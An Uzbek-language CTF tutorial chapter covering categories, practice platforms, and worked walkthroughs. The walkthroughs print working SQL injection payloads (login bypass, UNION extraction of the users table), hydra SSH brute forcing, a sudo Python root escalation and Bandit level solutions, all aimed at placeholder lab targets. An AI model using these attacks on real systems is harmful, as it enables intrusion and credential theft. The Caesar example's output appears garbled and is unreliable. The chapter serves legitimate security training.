# 📘 8-BOB: CTF VA AMALIYOT YO'RIQNOMASI

---

## 8.1 CTF nima?

CTF (Capture The Flag) — kiberxavfsizlik musobaqasi. Maqsad: yashirilgan "flag" ni topish.

**Flag ko'rinishi:**
```
CTF{bu_flag_hisoblanadi}
picoCTF{y0u_f0und_1t}
THM{tryhackme_flag}
HTB{hackthebox_flag}
```

**Nima uchun CTF?**
- 🧠 Amaliy ko'nikmalarni o'rganish
- 💼 CV ga qo'shish mumkin
- 👥 Hamjamiyat bilan ishlash
- 🎯 Haqiqiy hujum usullarini sinash
- 💰 Pul mukofotlari (ba'zi musobaqalarda)

---

## 8.2 CTF kategoriyalari

### 🌐 Web
- SQL Injection, XSS, IDOR, LFI, RFI
- Cookie manipulation, JWT zaifliklar
- Source code tahlili

### 🔐 Cryptography
- Hash crack, Encoding/Decoding
- Caesar, Vigenere, RSA zaifliklar
- XOR, Base64 layerlari

### 🔍 Forensics
- Rasmlardan ma'lumot topish (steganografiya)
- Packet capture tahlili (PCAP)
- Disk image tahlili
- Memory dump tahlili
- Deleted file recovery

### 💣 Pwn (Binary Exploitation)
- Buffer overflow
- Format string zaifliklar
- Return-Oriented Programming (ROP)
- Heap exploitation

### 🔄 Reverse Engineering
- Binary faylni tahlil qilish
- Assembly kodini o'qish
- Malware tahlili
- Obfuscated kod

### 🌍 OSINT
- Ochiq manbalardan ma'lumot topish
- Rasm orqali joy aniqlash
- Ijtimoiy tarmoqlar tahlili

### 📡 Network
- PCAP tahlili
- Protokol zaifliklar
- Tarmoq forensics

---

## 8.3 CTF platformalari va boshlash

### Boshlang'ichlar uchun:

```
1. PicoCTF (picoctf.org)
   - Eng yaxshi boshlang'ich platforma
   - Doimiy ochiq, har doim ishlaydi
   - Har bir task da hint bor

2. TryHackMe (tryhackme.com)
   - Yo'llab-qo'llanuvchi o'rganish
   - Bepul va Premium
   - "Jr Penetration Tester" yo'li

3. HackTheBox Starting Point (hackthebox.com)
   - Boshlang'ich mashinalari
   - Walk-through lar mavjud
```

### O'rta daraja:
```
4. HackTheBox (hackthebox.com)    - Real mashinalari buzish
5. VulnHub (vulnhub.com)          - VM yuklab mashq
6. OverTheWire (overthewire.org)  - Linux wargames
7. CryptoHack (cryptohack.org)    - Kriptografiya
8. PentesterLab (pentesterlab.com)- Web hacking
```

### Musobaqalar:
```
9. CTFtime.org  - Barcha CTF musobaqalar jadvali
10. DefCon CTF  - Dunyoning eng mashhuri
11. Google CTF  - Google tomonidan
```

---

## 8.4 CTF yechish metodologiyasi

### Qadamlar:
```
1. TASK NI O'QING    ← Diqqat bilan o'qing, iplar bor
2. KATEGORIYANI ANIQLANG ← Web? Crypto? Forensics?
3. HINT LARNI YOZING  ← Barcha ma'lumotlarni to'plang
4. ASBOBLARNI TANLANG ← Qaysi tool kerak?
5. SINAB KO'RING      ← Ketma-ket usullarni sinang
6. WRITE-UP O'QING    ← Qotib qolsangiz, o'rganing
```

---

## 8.5 Web CTF — Amaliy misollar

### Task: "Login bypass qiling"

```
Tavsif: Admin panelga kiring. Flag admin profilida.
URL: http://challenge.ctf/login
```

**Yechish:**
```bash
# 1. Sahifani ko'ring
curl http://challenge.ctf/login

# 2. Source code tekshirish (F12)
# <!-- admin / admin123 --> ko'rinishi mumkin!

# 3. SQL Injection sinash
Username: admin'--
Password: anything
# SQL: SELECT * FROM users WHERE user='admin'--' AND pass='...'
# -- dan keyin hammasi comment, pass tekshirilmaydi!

# 4. Default parollar sinash
admin/admin, admin/password, admin/admin123

# 5. Burp bilan brute force
# Intruder → Cluster bomb → username + password wordlist
```

### Task: "Yashirin flag"

```
Tavsif: Saytda flag yashirilgan.
URL: http://challenge.ctf/
```

**Yechish:**
```bash
# 1. Robots.txt
curl http://challenge.ctf/robots.txt
# Disallow: /secret_flag.txt  ← Bu yerda!

# 2. Source code
curl http://challenge.ctf/ | grep -i "flag\|ctf\|secret"
# <!-- Flag: CTF{hidden_in_source} -->

# 3. Cookies
# Burp da cookie ni ko'ring
# base64 decode qiling

# 4. HTTP Headers
curl -I http://challenge.ctf/
# X-Secret-Flag: CTF{in_headers}

# 5. Javascript fayllar
curl http://challenge.ctf/static/app.js | grep -i "flag\|ctf"
```

### Task: "SQL Injection"

```
Tavsif: Ma'lumotlar bazasidan admin parolini toping
URL: http://challenge.ctf/user?id=1
```

```bash
# 1. Zaiflikni tasdiqlash
curl "http://challenge.ctf/user?id=1'"
# SQL xato chiqsa - zaiflik bor!

# 2. Ustunlar sonini topish
curl "http://challenge.ctf/user?id=1 ORDER BY 1--"  # OK
curl "http://challenge.ctf/user?id=1 ORDER BY 2--"  # OK
curl "http://challenge.ctf/user?id=1 ORDER BY 3--"  # Xato → 2 ta ustun

# 3. UNION bilan ma'lumot olish
curl "http://challenge.ctf/user?id=999 UNION SELECT 1,2--"
# Sahifada 1 yoki 2 ko'rinadi → Ko'rinadigan ustun raqami

# 4. DB versiyasi
curl "http://challenge.ctf/user?id=999 UNION SELECT version(),2--"

# 5. Jadvallarni topish
curl "http://challenge.ctf/user?id=999 UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()--"

# 6. Ustunlarni topish
curl "http://challenge.ctf/user?id=999 UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'--"

# 7. Ma'lumot olish
curl "http://challenge.ctf/user?id=999 UNION SELECT username,password FROM users WHERE username='admin'--"
# CTF{sql_m4st3r_h4ck3r}
```

---

## 8.6 Cryptography CTF — Amaliy misollar

### Task: "Bu nima?"

```
Topshiriq: Quyidagi matni hal qiling:
U2Fsb20gQ1RGeydoZWxsb193b3JsZCd9
```

```bash
# Base64 decode
echo "U2Fsb20gQ1RGeydoZWxsb193b3JsZCd9" | base64 -d
# Natija: Salom CTF{'hello_world'}
```

### Task: "Caesar cipher"

```
Topshiriq: Vkb kc hvkc zxnt?
```

```python
def caesar_brute(matn):
    """Barcha 25 variantni sinash"""
    for shift in range(26):
        natija = ""
        for harf in matn:
            if harf.isalpha():
                baza = ord('A') if harf.isupper() else ord('a')
                natija += chr((ord(harf) - baza - shift) % 26 + baza)
            else:
                natija += harf
        print(f"Shift {shift:2d}: {natija}")

caesar_brute("Vkb kc hvkc zxnt?")
# Shift 3: Shy is this fine?  ← Ma'noli!
# Flag topildi!
```

### Task: "XOR Magic"

```python
# Berilgan: shifrlangan.bin va kalit = "ctf"
def xor_decrypt(fayl_yoli, kalit):
    with open(fayl_yoli, 'rb') as f:
        data = f.read()
    
    kalit_bytes = kalit.encode()
    natija = bytes([data[i] ^ kalit_bytes[i % len(kalit_bytes)]
                    for i in range(len(data))])
    print(natija.decode(errors='ignore'))

# xor_decrypt("shifrlangan.bin", "ctf")
```

### Task: "RSA zaiflik"

```python
# Kichik n bo'lsa, n ni faktorlash mumkin
# n = p * q, e va c berilgan
from sympy import factorint

def rsa_crack_small_n(n, e, c):
    # n ni faktorlash
    omillar = factorint(n)
    omil_list = list(omillar.keys())
    p, q = omil_list[0], omil_list[1]
    
    phi = (p - 1) * (q - 1)
    
    # d - private key
    d = pow(e, -1, phi)
    
    # Decrypt
    m = pow(c, d, n)
    
    # Raqamdan matnga
    flag = m.to_bytes((m.bit_length() + 7) // 8, 'big').decode()
    print(f"p = {p}, q = {q}")
    print(f"Flag: {flag}")

# rsa_crack_small_n(n=3233, e=17, c=2790)
```

---

## 8.7 Forensics CTF — Amaliy misollar

### Task: "Rasmda nima bor?"

```bash
# 1. Fayl turini aniqlash
file rasm.jpg
file rasm.png

# 2. Metadata ko'rish
exiftool rasm.jpg
# Comment: CTF{metadata_flag}  ← Ko'pincha shu yerda!

# 3. Strings buyrug'i
strings rasm.jpg | grep -i "ctf\|flag"
strings rasm.jpg | grep "CTF{"

# 4. Steghide bilan yashirin fayl
steghide extract -sf rasm.jpg
steghide extract -sf rasm.jpg -p ""        # Bo'sh parol
steghide extract -sf rasm.jpg -p "password"

# 5. Stegsolve (Java dastur) - ko'p layerlarni ko'rish
java -jar stegsolve.jar

# 6. Zsteg (PNG uchun)
zsteg rasm.png
zsteg -a rasm.png    # Barcha usullar

# 7. Binwalk - ichiga joylashtirilgan fayllar
binwalk rasm.jpg
binwalk -e rasm.jpg  # Chiqarish
# _rasm.jpg.extracted/ papkasini ko'ring

# 8. Hex editor bilan ko'rish
xxd rasm.jpg | head -50
xxd rasm.jpg | grep -i "ctf"
```

### Task: "PCAP tahlil"

```bash
# Wireshark bilan PCAP ochish
wireshark traffic.pcap

# Yoki terminalmda:
# 1. Barcha ulanishlar
tcpdump -r traffic.pcap -n

# 2. HTTP trafikni ko'rish
tcpdump -r traffic.pcap -A 'tcp port 80'

# 3. Tshark bilan filtrlash
tshark -r traffic.pcap -Y "http" -T fields -e http.request.uri
tshark -r traffic.pcap -Y "http.request.method == POST" -V

# 4. Fayllarni ajratib olish
tcpdump -r traffic.pcap -w http_only.pcap 'tcp port 80'
# Wireshark: File → Export Objects → HTTP

# 5. String qidirish
strings traffic.pcap | grep "CTF{"
strings traffic.pcap | grep -E "flag|password|secret"

# 6. FTP parolini topish
tshark -r traffic.pcap -Y "ftp" -V | grep -E "USER|PASS"

# 7. DNS so'rovlari
tshark -r traffic.pcap -Y "dns" -T fields -e dns.qry.name
```

### Task: "Memory Forensics"

```bash
# Volatility — memory dump tahlili
# O'rnatish
pip3 install volatility3

# Profil aniqlash
vol.py -f memory.dmp windows.info
vol.py -f memory.dmp linux.info

# Jarayonlar
vol.py -f memory.dmp windows.pslist
vol.py -f memory.dmp windows.pstree

# Network ulanishlar
vol.py -f memory.dmp windows.netstat

# Fayllar
vol.py -f memory.dmp windows.filescan | grep -i "flag\|ctf"

# Dump qilish
vol.py -f memory.dmp windows.dumpfiles --physaddr 0x12345678

# Parollar (hashdump)
vol.py -f memory.dmp windows.hashdump

# String qidirish
vol.py -f memory.dmp windows.strings | grep "CTF{"
```

---

## 8.8 Reverse Engineering CTF

```bash
# 1. Fayl turini aniqlash
file challenge
# challenge: ELF 64-bit LSB executable  ← Linux binary

# 2. Strings
strings challenge | grep -i "flag\|ctf\|correct\|wrong"
strings challenge | grep "CTF{"

# 3. ltrace — kutubxona chaqiruvlari
ltrace ./challenge

# 4. strace — tizim chaqiruvlari
strace ./challenge

# 5. Ghidra (bepul dekompiler)
# https://ghidra-sre.org/
# Import → Analyze → main() funksiyasini toping

# 6. GDB — debugger
gdb ./challenge
(gdb) info functions      # Funksiyalar ro'yxati
(gdb) break main          # Breakpoint
(gdb) run                 # Ishga tushirish
(gdb) disas main          # Disassembly
(gdb) x/s 0x401234        # Manzildagi string

# 7. radare2
r2 ./challenge
[0x00401000]> aaa          # Tahlil
[0x00401000]> afl          # Funksiyalar
[0x00401000]> pdf @main    # main disassembly
```

---

## 8.9 OverTheWire — Bandit (Linux CTF)

Bandit — Linux ko'nikmalarini o'rganish uchun eng yaxshi wargame.
URL: `overthewire.org/wargames/bandit`

```bash
# Level 0 → SSH bilan ulanish
ssh bandit0@bandit.labs.overthewire.org -p 2220
# Parol: bandit0

# Level 0→1: readme faylida flag
cat readme

# Level 1→2: - nomli fayl
cat ./-

# Level 2→3: Bo'sh joyli fayl
cat "spaces in this filename"

# Level 3→4: Yashirin fayl
ls -la inhere/
cat inhere/.hidden

# Level 4→5: Insonlar o'qiy oladigan fayl
file inhere/-file0*
cat inhere/-file07    # ASCII text bo'lgan

# Level 5→6: Muayyan o'lchamli fayl
find inhere/ -size 1033c ! -executable

# Level 6→7: Butun tizimda qidirish
find / -user bandit7 -group bandit6 -size 33c 2>/dev/null

# Level 7→8: Millionth so'zidan keyin
grep "millionth" data.txt

# Level 8→9: Faqat bir marta uchragan satr
sort data.txt | uniq -u

# Level 9→10: Strings va grep
strings data.txt | grep "=="

# Level 10→11: Base64
base64 -d data.txt

# Level 11→12: ROT13
cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# Level 12→13: Hexdump → arxiv
mkdir /tmp/mydir
cp data.txt /tmp/mydir/
cd /tmp/mydir
xxd -r data.txt > data.bin
file data.bin          # Compress tur ni aniqlash
# gzip → gunzip, bzip2 → bunzip2, tar → tar -xf
```

---

## 8.10 TryHackMe — Birinchi mashina

**"Basic Pentesting" machine yechish:**

```bash
# 1. Mashina IP ni oling (TryHackMe VPN bilan)
# 2. Skan boshlang

# Recon
nmap -sC -sV -p- TARGET_IP -oN scan.txt

# Natija tahlili:
# 22/tcp SSH
# 80/tcp HTTP Apache
# 139/tcp SMB
# 445/tcp SMB

# Web
curl http://TARGET_IP/robots.txt
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt

# SMB
enum4linux TARGET_IP
# Foydalanuvchi nomi topildi: john

# SSH brute force
hydra -l john -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP

# SSH kirish
ssh john@TARGET_IP
# Parol topildi!

# Flag olish
cat /home/john/flag.txt
cat /root/flag.txt  # Root kerak bo'lishi mumkin

# Privilege Escalation
sudo -l
# (ALL) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
# Root!
cat /root/flag.txt
```

---

## 8.11 CTF yechganda foydali resurslar

```bash
# Online toollar:
# CyberChef      → gchq.github.io/CyberChef  (barcha encoding)
# dcode.fr       → barcha cipher
# quipqiup.com   → substitution cipher
# crackstation.net → hash lookup

# Offline toollar Kali da:
# Steganografiya
apt install steghide stegosuite
pip3 install stegcracker

# Forensics
apt install volatility autopsy foremost
pip3 install oletools    # Office malware

# Crypto
pip3 install pycryptodome sympy

# Reverse
apt install gdb radare2 ghidra

# CTF framework
pip3 install pwntools    # Pwn uchun eng yaxshi
```

---

## 8.12 Bob yakunida bilishingiz kerak

✅ CTF kategoriyalarini tushunish  
✅ Web CTF: SQLi, yashirin sahifalar  
✅ Crypto CTF: Base64, Caesar, XOR  
✅ Forensics: steghide, binwalk, Wireshark  
✅ OverTheWire Bandit o'ynash  
✅ TryHackMe mashina yechish  

---

## 📝 Amaliy topshiriq #8

```
1. PicoCTF.org ga ro'yxatdan o'ting
   - "General Skills" bo'limidagi 5 ta taskni yeching
   - "Cryptography" dan 3 ta taskni yeching
   - "Web Exploitation" dan 2 ta taskni yeching

2. OverTheWire Bandit:
   - Kamida 15-levelgacha yeching
   - Har level uchun qo'llagan buyruqni yozing

3. TryHackMe:
   - "Basic Pentesting" room ni yeching
   - "RootMe" room ni yeching
   - Ikkala flag ni toping (user.txt va root.txt)

4. CTFtime.org ga ro'yxatdan o'ting va yaqin CTF ga yoziling
```

---

*Keyingi bob → 🏅 Sertifikatlar va Karyera*
